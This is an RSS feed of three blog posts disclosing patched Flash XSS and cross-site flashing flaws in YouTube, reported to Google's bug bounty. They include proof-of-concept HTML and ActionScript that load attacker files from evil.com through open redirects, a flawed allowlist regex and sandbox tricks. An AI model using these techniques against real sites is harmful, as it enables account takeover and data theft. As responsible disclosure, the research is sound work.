@@ -1,0 +1,381 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+	xmlns:georss="http://www.georss.org/georss"
+	xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+	>
+
+<channel>
+	<title>Youtube &#8211; OpnSec</title>
+	<atom:link href="/tag/youtube/feed/" rel="self" type="application/rss+xml" />
+	<link></link>
+	<description>Open mind Security and Crypto!</description>
+	<lastBuildDate>Fri, 30 Jul 2021 20:07:09 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.0.11</generator>
+
+<image>
+	<url>/wp-content/uploads/2017/08/cropped-opnsec-32x32.png</url>
+	<title>Youtube &#8211; OpnSec</title>
+	<link></link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+<site xmlns="com-wordpress:feed-additions:1">250189475</site>	<item>
+		<title>Advanced Flash vulnerabilities in Youtube &#8211; Part 4</title>
+		<link>/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=advanced-flash-vulnerabilities-in-youtube-part-4</link>
+					<comments>/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/#comments</comments>
+		
+		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
+		<pubDate>Wed, 13 Sep 2017 13:51:02 +0000</pubDate>
+				<category><![CDATA[Flash]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[XSS]]></category>
+		<category><![CDATA[Youtube]]></category>
+		<guid isPermaLink="false">/?p=188</guid>
+
+					<description><![CDATA[IV. Flash based XSSes on Youtube iframe api I&#8217;m happy that people found my previous posts on Youtube Flash vulnerabilities interesting, and I will keep posting new write-ups. This time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback). Youtube html5 api is called Youtube iframe api, because&#8230; <a class="read-more" href="/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/">Read More</a>]]></description>
+										<content:encoded><![CDATA[<h3>IV. Flash based XSSes on Youtube iframe api</h3>
+<p><img loading="lazy" class="alignnone size-medium wp-image-203" style="display: none;" src="/wp-content/uploads/2017/09/Youtube-iframe-Api.png" alt="" width="1" height="1" srcset="/wp-content/uploads/2017/09/Youtube-iframe-Api.png 1133w, /wp-content/uploads/2017/09/Youtube-iframe-Api-150x150.png 150w, /wp-content/uploads/2017/09/Youtube-iframe-Api-300x146.png 300w, /wp-content/uploads/2017/09/Youtube-iframe-Api-768x375.png 768w, /wp-content/uploads/2017/09/Youtube-iframe-Api-1024x500.png 1024w, /wp-content/uploads/2017/09/Youtube-iframe-Api-640x360.png 640w" sizes="(max-width: 1px) 100vw, 1px" />I&#8217;m happy that people found my <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube/">previous posts on Youtube Flash vulnerabilities</a> interesting, and I will keep posting new write-ups.<br />
+This time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback).</p>
+<p>Youtube html5 api is called <a href="https://developers.google.com/youtube/iframe_api_reference" target="_blank" rel="noopener noreferrer">Youtube iframe api</a>, because the entry point is an iframe located at youtube.com/embed/[VIDEO_ID].<br />
+When the iframe loads, it will first check if the browser is able to play videos using html5, and if not it will use the Flash fallback. Until recently, it was possible to force the Flash fallback for all browsers using the URL parameter nohtml5=1. This is what we will do here.</p>
+<p>Here is the workflow of the Youtube iframe api with Flash fallback:</p>
+<p><a href="/wp-content/uploads/2017/09/Diagramme8.svg"><img loading="lazy" class="wp-image-189 aligncenter" src="/wp-content/uploads/2017/09/Diagramme8.svg" alt="" width="675" height="449" /></a></p>
+<p>If you compare with the workflow of the Youtube Flash api in <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube/" target="_blank" rel="noopener noreferrer">part 1</a>, the Flash file &#8220;Youtube Wrapper&#8221; has been replaced by the iframe &#8220;Youtube Embed&#8221;, and consequently Flash to javascript api has been replaced by postMessage api and sharedEvent api has been replaced by Flash to javascript api. This should give you a sense of how Flash and javascript are very similar, only the implementation is different.</p>
+<blockquote><p>Youtube Flash api and Youtube iframe api are so similar that <a href="https://bugzilla.mozilla.org/show_bug.cgi?format=default&amp;id=769117" target="_blank" rel="noopener noreferrer">Firefox </a>, <a href="https://groups.google.com/a/chromium.org/forum/#!msg/chromium-dev/BW8g1iB0jLs/uddWuBroBAAJ" target="_blank" rel="noopener noreferrer">Chrome </a>and <a href="https://github.com/WebKit/webkit/blob/master/Source/WebCore/Modules/plugins/YouTubePluginReplacement.cpp" target="_blank" rel="noopener noreferrer">Safari </a>have implemented an interesting/weird <a href="https://github.com/whatwg/html/issues/2390" target="_blank" rel="noopener noreferrer">behaviour </a>where any &lt;object data=&#8221;youtube.com/v/[VIDEO_ID]&#8221;&gt; (Youtube Flash api) will be automatically replaced by &lt;object data=&#8221;youtube.com/embed/[VIDEO_ID]&#8221;&gt;(Youtube iframe api) where the &lt;object&gt; will actually behave as an iframe. The objective is to force old websites to switch to Youtube iframe api without making any change in the websites themselves.</p></blockquote>
+<p>To trigger a Flash based XSS on youtube.com, you have to either load a Flash file located at youtube.com directly from the address bar, or exploit any Flash file embed in a html page located at youtube.com. Here we will exploit the Flash file &#8220;Main App&#8221; which is embed in youtube.com/embed, and from there we will execute arbitrary javascript on youtube.com/embed.<br />
+When an external website embeds a Youtube iframe, it can send <a href="https://developers.google.com/youtube/iframe_api_reference#Functions" target="_blank" rel="noopener noreferrer">commands </a>to the Youtube iframe using the postMessage api such as playVideo(), pauseVideo(), etc&#8230; The Youtube iframe will then transmit the command to the Flash Main App (using the Flash to javascript api).</p>
+<p>&nbsp;</p>
+<h3>1. Flash based XSS using loadPlaylist command</h3>
+<p>One particular command is <a href="https://developers.google.com/youtube/iframe_api_reference#loadPlaylist" target="_blank" rel="noopener noreferrer">loadPlaylist()</a> which will make the Youtube iframe load a playlist. The argument of loadPlaylist() can either be a Youtube playlist ID or an array of Youtube video IDs. When using an array of Youtube video IDs, it is possible to inject arbitrary poster (thumbnail) image url for each video.<br />
+Loading an image in Flash is similar to loading an external Flash file using Loader.load(), so we could load an arbitrary Flash file using this. Main App checks if the url of the poster image is a youtube.com url and then loads the image. Now you might be aware that Google doesn&#8217;t believe that open redirections are security issues! This makes url sanitization very difficult, because you just need to provide a youtube.com url that will redirect to an arbitrary location. I didn&#8217;t find an open redirector directly on youtube.com. However, I found a youtube.com url that will redirect to any google.com url. From there it was easy to find an open redirector on google.com that would redirect to evil.com. The full url payload was <pre><code >https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf</code></pre><br />
+Once evil.swf is loaded on youtube.com/embed it can execute arbitrary javascript using the Flash to javascript api, which means XSS on youtube.com!</p>
+<blockquote><p>Note: By default only Flash file located on the same domain than the html host page can use the Flash to javascript api. But in youtube.com/embed/[VIDEO_ID] the Main App &lt;object&gt; tag contains the attribute &#8220;<a href="https://helpx.adobe.com/flash/kb/control-access-scripts-host-web.html" target="_blank" rel="noopener noreferrer">allowscriptaccess=always</a>&#8221; which means that any Flash file loaded by the Main App will be able to use the Flash to javascript api on youtube.com/embed/[VIDEO_ID]</p></blockquote>
+<p>Here is the workflow of the POC:</p>
+<p><a href="/wp-content/uploads/2017/09/Diagramme9.svg"><img loading="lazy" class="wp-image-190 aligncenter" src="/wp-content/uploads/2017/09/Diagramme9.svg" alt="" width="864" height="350" /></a></p>
+<p>evil.com/evil.html source code:</p>
+<pre><code >&lt;!DOCTYPE html&gt;<br />
+&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;!-- Youtube iframe api with forced Flash fallback --&gt;<br />
+&lt;iframe id="player" src="https://www.youtube.com/embed/?nohtml5=1"&gt;&lt;/iframe&gt;<br />
+&lt;script&gt;<br />
+// Wait 5 seconds to let the Youtube iframe fully load<br />
+setTimeout(<br />
+function(){<br />
+// Send the loadPlaylist command to the Youtube iframe using postMessage api, with the image payload<br />
+document.getElementById("player").contentWindow.postMessage('{"command":"loadPlaylist","data":[{"video_id":"xyz","iurl":"https://accounts.youtube.com/accounts/SetSID?continue=https%3A%2F%2Fwww.google.com%2Famp%2Fs%2Fevil.com%2Fevil.swf"}]}', "*");<br />
+}<br />
+, 5000);<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre>
+<p>evil.swf source code:</p>
+<pre><code >public class Main extends Sprite {<br />
+public function Main(){<br />
+// Execute arbitrary javascript on youtube.com/embed using ExternalInterface (Flash to javascript api)<br />
+ExternalInterface.call("alert", "document.domain + ' XSSed!'");<br />
+}<br />
+}</code></pre>
+<p>Attack Scenario:<br />
+Prerequisite: The victim has Flash Player enabled<br />
+1. The victim visits evil.com/evil.html<br />
+2. evil.html loads youtube.com/embed iframe<br />
+3. evil.html sends the loadPlaylist payload<br />
+4. youtube.com/embed loads evil.swf<br />
+5. evil.swf execute XSS on youtube.com/embed</p>
+<p>Mitigation:<br />
+Google patched the Main App so that it doesn&#8217;t take picture url into account in loadPlaylist arguments.</p>
+<p>Timeline:<br />
+10/05/2016 Reported to Google<br />
+10/11/2016 &#8220;Nice catch&#8221; and reward<img loading="lazy" class="alignnone wp-image-141" src="/wp-content/uploads/2017/08/2-stars.png" alt="" width="56" height="13" /><br />
+11/09/2016 Bug fixed and verified</p>
+<p>&nbsp;</p>
+<h3>2. Flash based XSS using trustedLoader Regex</h3>
+<p>In addition to public commands like playVideo() or loadPlaylist(), Youtube api has private commands that are available only if the webpage that loads the Youtube iframe is from a verified, trusted origin (like youtube.com or drive.google.com/xxx). To do this, the Main App uses a whitelist stored in a regex. The regex is like this :<br />
+<pre><code >public static const trustedLoader:RegExp = new RegExp("^https?://((www\.|encrypted\.)?google(\.com|\.co)?\.[a-z]{2,3}/(search|webhp)\?|24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf|www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris|tpc\.googlesyndication\.com/safeframe/|lightbox-(demos|builder)\.appspot\.com/|([A-Za-z0-9-]{1,63}\.)*(imasdk\.googleapis\.com|corp\.google\.com|borg\.google\.com|docs\.google\.com|drive\.google\.com|googleads\.g\.doubleclick\.net|googleplex\.com|play\.google\.com|prod\.google\.com|sandbox\.google\.com|photos\.google\.com|picasaweb\.google\.com|lh2\.google\.com|plus\.google\.com|books\.googleusercontent\.com|mail\.google\.com|talkgadget\.google\.com|survey\.g\.doubleclick\.net|youtube\.com|youtube\.googleapis\.com|youtube-nocookie\.com|youtubeeducation\.com|vevo\.com)(:[0-9]+)?([\/\?\#]|$))");</code></pre></p>
+<blockquote><p>Before reading more, you should check the regex yourself and try to find the mistake in it!</p>
+<p>&nbsp;</p></blockquote>
+<p>&#8220;.&#8221; (dot) is a wildcard in Regex, which means it will match any character. If you only want to match a literal dot, you have to escape it like this &#8220;\.&#8221;<br />
+In trustedLoader RegExp, we have this code : <pre><code >24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf</code></pre><br />
+where the dots are not escaped. This means that we can replace the dots by any character and it will still match the Regex.<br />
+in particular, http://24e12c4a-a-95274a9c-s-sites<strong>A</strong>googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf will match the regex, and this domain is not owned by Google. It was available so I bought it for 1$! (You could use any alphanumeric character instead of A)<br />
+I hosted a html page at http://24e12c4a-a-95274a9c-s-sites<strong>A</strong>googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf that will load a Youtube iframe and I have access to the private commands of the Youtube api.</p>
+<p>Among the private commands there is a function updateVideoData(), that allows you to inject an arbitrary Flash file as a poster image exactly like with loadPlaylist() before. I won&#8217;t go into details as the rest of the report is similar to previous one.</p>
+<p>Mitigation:<br />
+Google patched trustedLoader Regex to properly escape dots like this 24e12c4a-a-95274a9c-s-sites\.googlegroups\.com/a/google\.com/flash-api-test-harness/apiharness\.swf</p>
+<p>Timeline:<br />
+11/22/2016 Report to Google<br />
+11/29/2016 Reward<img loading="lazy" class="alignnone wp-image-141" src="/wp-content/uploads/2017/08/2-stars.png" alt="" width="56" height="13" /><br />
+01/18/2017 Issue fixed and verified</p>
+<p>&nbsp;</p>
+<h3>3. Flash based XSS using trustedLoader regex&#8230; again!</h3>
+<p>Let&#8217;s have a look at the trustedLoader regex again. There are still problems with it! For example <pre><code >google(\.com|\.co)?\.[a-z]{2,3}</code></pre> is not a secure way to check that a domain is a Google owned domain because <pre><code >google.com.fun</code></pre> for example will match the regex but is not a Google owned domain.<br />
+Let&#8217;s take another example: <pre><code >www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris</code></pre> is consider a trusted url. But there are XSSes in other www.gstatic.com webpages, and from there we can execute arbitrary javascript on www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris and then load a Youtube iframe, send a updateVideoData() command and execute XSS on youtube.com/embed.</p>
+<p>Let&#8217;s make a drawing of the attack workflow:</p>
+<p><a href="/wp-content/uploads/2017/09/Diagramme10.svg"><img loading="lazy" class="wp-image-191 aligncenter" src="/wp-content/uploads/2017/09/Diagramme10.svg" alt="" width="923" height="406" /></a></p>
+<p>Technical details:<br />
+Prerequisite: The victim has Flash Player and opens www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf?chartId=[arbitrary javascript]<br />
+1. The arbitrary javascript makes www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf load an iframe at https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris<br />
+2-3-4. The arbitrary javascript makes https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris load an iframe at youtube.com/embed<br />
+5. The arbitrary javascript sends a updateVideoData() command to Youtube iframe<br />
+6. Youtube iframe accepts the command because https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris is a trusted loader, and transmits it to Main App<br />
+7. Main App loads arbitrary Flash file (the open redirection was different this time because previous one was fixed)<br />
+8. Evil Flash file executes XSS on youtube.com/embed</p>
+<p>&nbsp;</p>
+<p>Mitigation:<br />
+Youtube removed the option nohtml5=1 to force the Flash fallback. There are still similar vulnerabilities but they are now limited to browsers that can&#8217;t play video using html5. This is typically very old browsers that are out of scope for Bug Bounty programs.</p>
+<p>Timeline:<br />
+02/02/2017 Report to Google<br />
+02/02/2017 &#8220;Nice catch&#8221; from Eduardo, who also advised me to apply to <a href="https://www.google.com/about/appsecurity/research-grants/" target="_blank" rel="noopener noreferrer">Google Research Grants </a>program<br />
+02/14/2017 Reward <img loading="lazy" class="alignnone size-full wp-image-70" src="/wp-content/uploads/2017/08/3-stars.png" alt="" width="60" height="14" /><br />
+04/11/2017 Issue fixed and verified</p>
+<p>Conclusion:<br />
+You can see that Flash and javascript are very similar and can be used together or you can replace one by the other. The same is true for Flash security and javascript security, this is why I think it is useful to learn about Flash implementation vulnerabilities in order to build more secure javascript applications (especially when there is a Flash fallback). You can also see that Flash based XSS are very similar to DOM XSSes is the sense that they only reveal during code execution and cannot be caught by Web Application Firewalls, browser based mitigation like XSS auditor or even vulnerability scanners.</p>
+<p>Thank you very much for reading, and I also want to thank Google VRP team because you are really doing an amazing work!</p>
+<p>In the future I will disclose more mixed javascript/Flash bugs from Youtube, Facebook, WordPress and others, and slowly we will get rid of Flash and I will disclose pure javascript vulnerabilities on those domains.</p>
+
+<div class="twitter-share"><a href="https://twitter.com/intent/tweet?text=Flash%20based%20%23XSS-es%20on%20Youtube%20iframe%20api%20%28Flash%20vulnerabilities%20in%20Youtube%20Part%204%29&#038;url=https%3A%2F%2Fopnsec.com%2F2017%2F09%2Fadvanced-flash-vulnerabilities-in-youtube-part-4%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
+]]></content:encoded>
+					
+					<wfw:commentRss>/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/feed/</wfw:commentRss>
+			<slash:comments>4</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">188</post-id>	</item>
+		<item>
+		<title>Advanced Flash Vulnerabilities in Youtube &#8211; Part 3</title>
+		<link>/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=advanced-flash-vulnerabilities-in-youtube-part-3</link>
+		
+		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
+		<pubDate>Wed, 30 Aug 2017 12:04:52 +0000</pubDate>
+				<category><![CDATA[Flash]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[Youtube]]></category>
+		<guid isPermaLink="false">/?p=64</guid>
+
+					<description><![CDATA[III. XSF via loaderinfo.url redefinition Let&#8217;s have a look at how the Main App loads the Modules : The url of the module is dynamically generated by the main app by using it&#8217;s own url (2) and replacing the filename (watch_as3.swf) by the module filename (subtitles.swf) (3). This allows to handle multiple versions on the&#8230; <a class="read-more" href="/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/">Read More</a>]]></description>
+										<content:encoded><![CDATA[<h3>III. XSF via loaderinfo.url redefinition</h3>
+<p><img loading="lazy" class="alignnone size-medium wp-image-150" style="display: none;" src="/wp-content/uploads/2017/08/s.ytimg_.com-POC-300x121.png" alt="" width="1" height="1" srcset="/wp-content/uploads/2017/08/s.ytimg_.com-POC-300x121.png 300w, /wp-content/uploads/2017/08/s.ytimg_.com-POC-150x150.png 150w, /wp-content/uploads/2017/08/s.ytimg_.com-POC-768x310.png 768w, /wp-content/uploads/2017/08/s.ytimg_.com-POC-1024x414.png 1024w, /wp-content/uploads/2017/08/s.ytimg_.com-POC-640x360.png 640w, /wp-content/uploads/2017/08/s.ytimg_.com-POC.png 1186w" sizes="(max-width: 1px) 100vw, 1px" />Let&#8217;s have a look at how the Main App loads the Modules :</p>
+<p><a href="/wp-content/uploads/2017/08/Diagramme7.svg"><img loading="lazy" class="wp-image-66 aligncenter" src="/wp-content/uploads/2017/08/Diagramme7.svg" alt="" width="907" height="217" /></a></p>
+<p>The url of the module is dynamically generated by the main app by using it&#8217;s own url (2) and replacing the filename (watch_as3.swf) by the module filename (subtitles.swf) (3). This allows to handle multiple versions on the Main App, each one with it&#8217;s own Modules location.</p>
+<p>To find it&#8217;s own url, the main app uses the <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/LoaderInfo.html#url" target="_blank" rel="noopener noreferrer">loaderinfo.url</a> property of appLoader.</p>
+<blockquote><p>Since appLoader is similar to an &lt;iframe&gt; in html, appLoader.loaderInfo.url is similar to the &#8220;src&#8221; attribute of the iframe.</p></blockquote>
+<p>In flash a Loader can load multiple swf files while in html an iframe can only load one window at a time</p>
+<p>This means that if appLoader first loads the Main App and then immediately loads another Flash file the loaderinfo.url property of the Main app will not reflect the url of the Main App but instead the url of the other loaded flash file.<br />
+POC workflow</p>
+<p><a href="/wp-content/uploads/2017/08/Diagramme5.svg"><img loading="lazy" class="wp-image-68 aligncenter" src="/wp-content/uploads/2017/08/Diagramme5.svg" alt="" width="818" height="314" /></a></p>
+<p>We removed Youtube Wrapper and replaced it with Evil Wrapper. Evil Wrapper will first load the Main App (1), and then immediately load another file (Noop.swf) with the same Loader appLoader (2). When the Main app will try to load a Module, it will get the appLoader url value (3) (evil.com/Noop.swf), replace the filename with the module name (evil.com/subtitles.swf) and load an arbitrary Flash file into it own Flash security sandbox (4).</p>
+<p>From there Evil Module will be in the Main App Security Sandbox and will appear to be located at s.ytimg.com/[[IMPORT]]/evil.com/subtitles.swf. However, s.ytimg.com is a sandboxed domain which doesn&#8217;t have any cookie, CSRF token or webpage to exploit.</p>
+<p>In <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/">part 2</a> I introduced URLLoader, which is similar to XHR. You can make cross-domain requests with URLLoader if the remote server has a crossdomain.xml file allowing &#8220;s.ytimg.com&#8221;</p>
+<blockquote><p>crossdomain.xml mechanism is similar to CORS headers for XHR cross-domain requests in javascript</p></blockquote>
+<p>The good news is that <a href="https://www.youtube.com/crossdomain.xml" target="_blank" rel="noopener noreferrer">https://www.youtube.com/crossdomain.xml</a> does allow https://s.ytimg.com/. Even more, <a href="https://drive.google.com/crossdomain.xml" target="_blank" rel="noopener noreferrer">https://drive.google.com/crossdomain.xml</a>, <a href="https://docs.google.com/crossdomain.xml" target="_blank" rel="noopener noreferrer">https://docs.google.com/crossdomain.xml</a> and <a href="https://clients6.google.com/crossdomain.xml" target="_blank" rel="noopener noreferrer">other google domains </a>also allow https://s.ytimg.com/.</p>
+<p>This means that Evil Module can send requests to any URL at youtube.com, drive.google.com and docs.google.com (including POST requests and custom headers) and read the response source code (5).<br />
+Attack scenario:<br />
+1. The victim is logged in Youtube or Google Drive and has Flash player<br />
+2. The victim visits the attacker evil.com/evil.html page which contains a Flash object evil.com/evil.swf<br />
+3. The attacker has control over the victim&#8217;s Youtube, Google Drive and Google Docs accounts</p>
+<p>Impact:<br />
+The attacker can steal private information, CSRF tokens and perform any CSRF action on these domains. A very nasty exploit could steal and delete all the victim Google Drive files and then post the POC url on Youtube comments from the victim account to spread the exploit. I won&#8217;t provide such POC (I would like to safely return to DefCon next year&#8230;) but it would only take about 20 LOC to build it!</p>
+<p>Timeline:<br />
+09/11/2015 &#8211; reported to Google VRP<br />
+09/16/2015 &#8211; &#8220;Nice catch&#8221; from Google<br />
+09/25/2015 &#8211; Temporary mitigation and reward<img loading="lazy" class="alignnone size-full wp-image-70" src="/wp-content/uploads/2017/08/3-stars.png" alt="" width="60" height="14" /><br />
+10/14/2015 &#8211; Issue fixed and verified</p>
+<p>Conclusion:<br />
+When using a sandboxed domain for hosting untrusted applications, like s.ytimg.com, you should always make sure that the sandboxed domain has no privilege on sensitive domains, like crossdomain.xml files, CORS, framing or CSP.</p>
+<p>[<strong>UPDATED</strong>] <strong><a href="/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/">Part 4 </a></strong>is now online with 3 Flash based XSS on Youtube!</p>
+<p>You can also see a live Flash based XSS on twitter <a href="/twitter/photo.html" target="_blank" rel="noopener noreferrer">here</a></p>
+
+<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F08%2Fadvanced-flash-vulnerabilities-in-youtube-part-3%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
+]]></content:encoded>
+					
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">64</post-id>	</item>
+		<item>
+		<title>Advanced Flash Vulnerabilities in Youtube &#8211; Part 2</title>
+		<link>/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=advanced-flash-vulnerabilities-in-youtube-part-2</link>
+		
+		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
+		<pubDate>Wed, 30 Aug 2017 11:21:40 +0000</pubDate>
+				<category><![CDATA[Flash]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[Youtube]]></category>
+		<guid isPermaLink="false">/?p=53</guid>
+
+					<description><![CDATA[II. XSF via appLoader In Part 1, I introduced an information leakage vulnerability in Youtube. In this part I will disclose a more severe vulnerability that allows arbitrary Flash code execution in youtube.com. This type of vulnerability is very similar to XSS except we execute Flash code instead of Javascript. It is called Cross-Site Flashing&#8230; <a class="read-more" href="/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/">Read More</a>]]></description>
+										<content:encoded><![CDATA[<h3>II. XSF via appLoader</h3>
+<p><img loading="lazy" class="alignnone size-medium wp-image-149" style="display: none;" src="/wp-content/uploads/2017/08/Youtube-POC-300x116.png" alt="" width="1" height="1" srcset="/wp-content/uploads/2017/08/Youtube-POC-300x116.png 300w, /wp-content/uploads/2017/08/Youtube-POC-150x150.png 150w, /wp-content/uploads/2017/08/Youtube-POC-768x296.png 768w, /wp-content/uploads/2017/08/Youtube-POC-1024x395.png 1024w, /wp-content/uploads/2017/08/Youtube-POC-640x360.png 640w, /wp-content/uploads/2017/08/Youtube-POC.png 1190w" sizes="(max-width: 1px) 100vw, 1px" />In <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube/"><strong>Part 1</strong></a>, I introduced an information leakage vulnerability in Youtube. In this part I will disclose a more severe vulnerability that allows arbitrary Flash code execution in youtube.com.<br />
+This type of vulnerability is very similar to XSS except we execute Flash code instead of Javascript. It is called Cross-Site Flashing (XSF) or Same-Origin Policy Bypass using Flash.</p>
+<p>It will get a little bit more complex, you can read more about Flash security model <a href="http://www.senocular.com/flash/tutorials/contentdomains/" target="_blank" rel="noopener noreferrer">here</a>.</p>
+<p>Let&#8217;s have a look at the Youtube Flash Api, this time showing the security sandboxes.</p>
+<p><img loading="lazy" class="wp-image-54 aligncenter" src="/wp-content/uploads/2017/08/Diagramme6.svg" alt="" width="905" height="241" /></p>
+<p>A <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/Loader.html" target="_blank" rel="noopener noreferrer">Loader </a>object can load an external Flash file in 2 ways :</p>
+<p>(1) In the normal way, the 2 Flash files are in separate Security Sandboxes (like with &lt;iframe&gt; in html)</p>
+<p>(2) If the loader uses the argument &#8220;<a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/SecurityDomain.html" target="_blank" rel="noopener noreferrer">SecurityDomain.currentDomain</a>&#8220;, the <strong>loaded Flash file will execute in the loader security sandbox </strong>(similar to &lt;script src=&#8221;&#8221;&gt; in html, which is very different than loading an &lt;iframe&gt;!). This is how the Main App loads the Modules.<br />
+Note: don&#8217;t be fooled by the fact that the Main App and Modules files are both located in the same domain s.ytimg.com, this is not the reason why they are in the same security sandbox here, but because the Main App uses the argument &#8220;<a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/SecurityDomain.html" target="_blank" rel="noopener noreferrer">SecurityDomain.currentDomain</a>&#8221; to load Modules.</p>
+<p>We already saw in Part 1 a technique to access the Youtube appLoader property using youtubeWrapper.getChildAt(0). This time we will use appLoader to load another external file into Youtube security sandbox using appLoader.load(&#8220;evil.com/evil2.swf&#8221;, SecurityDomain.currentDomain).</p>
+<p>&nbsp;</p>
+<p>Here is the POC workflow</p>
+<p><a href="/wp-content/uploads/2017/08/Diagramme3.svg"><img loading="lazy" class="wp-image-59 aligncenter" src="/wp-content/uploads/2017/08/Diagramme3.svg" alt="" width="905" height="335" /></a></p>
+<p>And the POC code:</p>
+<pre><code >var loader = new Loader();<br />
+// Load the Youtube Wrapper (1)<br />
+loader.load(new URLRequest("https://www.youtube.com/v/[VIDEO_ID]"));<br />
+var youtubeWrapper = loader.content;<br />
+// Access the Youtube Wrapper appLoader object (3)<br />
+var appLoader = youtubeWrapper.getChildAt(0);<br />
+// Load evil2.swf in youtubeWrapper security sandbox. (4)<br />
+appLoader.load(new URLRequest("http://evil.com/evil2.swf"), new LoaderContext(false, ApplicationDomain.currentDomain, SecurityDomain.currentDomain));<br />
+// evil2.swf can execute arbitrary code in youtube.com security sandbox (5)</code></pre>
+<p>&nbsp;</p>
+<p>Technical details:<br />
+SecurityDomain.currentDomain is a relative value, since it&#8217;s apply to the <strong>current</strong> Security Sandbox. Flash documentation states that it is the security sandbox of the file where the instruction is written. Nice and easy, however, it is proven to be more complex here.</p>
+<p>appLoader is instantiated in Youtube Wrapper, but the call to appLoader.load(evil.com/evil2.swf, SecurityDomain.currentDomain ) is written in evil.swf. So evil2.swf should normally load in evil.swf security sandbox. If you debug the Flash execution, this is what is happening first (when looking for crossdomain.xml file). But at the last moment, because appLoader was instantiated in Youtube Wrapper, evil2.swf will actually execute in Youtube security sandbox.</p>
+<p>Once evil.com/evil2.swf is loaded in Youtube security sandbox, the Flash Player will treat it like if it was located at https://www.youtube.com/v/xxx/[[IMPORT]]/http://evil.com/evil2.swf.<br />
+This means that evil2.swf can send request to any https://www.youtube.com/ URL and read response source code using <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/URLLoader.html" target="_blank" rel="noopener noreferrer">URLLoader</a>.</p>
+<blockquote><p>URLLoader is similar to <a href="https://developer.mozilla.org/en/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener noreferrer">XHR </a>in javascript.</p></blockquote>
+<p>Impact:<br />
+Using this vulnerability, an attacker could access any private data on the victim&#8217;s Youtube account. It could access private videos, post comments on behalf of the victim or delete all the victim&#8217;s videos. The impact is similar to a reflective XSS on youtube.com.</p>
+<p>Attack scenario:<br />
+Prerequisite : The victim is logged in Youtube and have Flash active<br />
+1 The victim visits http://evil.com/evil.html<br />
+2 The attacker has control over the victim&#8217;s Youtube account</p>
+<p>Timeline:<br />
+05/20/2016 – reported to Google VRP<br />
+05/20/2016 – “Nice catch” from Google<br />
+05/24/2016 – reward<img loading="lazy" class="alignnone size-full wp-image-70" src="/wp-content/uploads/2017/08/2-stars.png" alt="" width="60" height="14" /><br />
+06/07/2016 – Issue fixed and verified<br />
+&nbsp;<br />
+Conclusion:<br />
+Security Sandbox is a great tool but it is complex and implemented deep inside the core language, making it difficult for developers to predict the exact behavior for edge cases (in particular if the language is not open source). Always be careful when using it.<br />
+&nbsp;<br />
+In <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/"><strong>Part 3</strong></a>, I will disclose another XSF and show how Flash vulnerability can be even more dangerous than XSS in some cases.<br />
+&nbsp;</p>
+
